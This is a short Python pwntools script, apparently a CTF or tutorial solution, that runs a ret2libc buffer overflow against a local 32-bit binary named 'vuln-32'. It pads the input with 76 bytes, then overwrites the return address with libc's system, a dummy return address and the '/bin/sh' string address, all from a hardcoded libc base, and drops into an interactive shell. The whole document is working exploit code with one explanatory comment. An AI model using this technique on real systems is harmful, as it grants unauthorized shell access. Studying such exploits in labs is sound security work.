from pwn import *

io = process('./vuln-32')

libc_base = 0xf7d65000
system = libc_base + 0x00524c0
bin_sh = libc_base + 0x1c9e3c



payload = b'A' * 76
payload += p32(system)
payload += p32(0x0)			# Make sure system has somewhere to return and so the stack aligns and doesn't crash
payload += p32(bin_sh)



io.clean()
io.sendline(payload)
io.interactive()
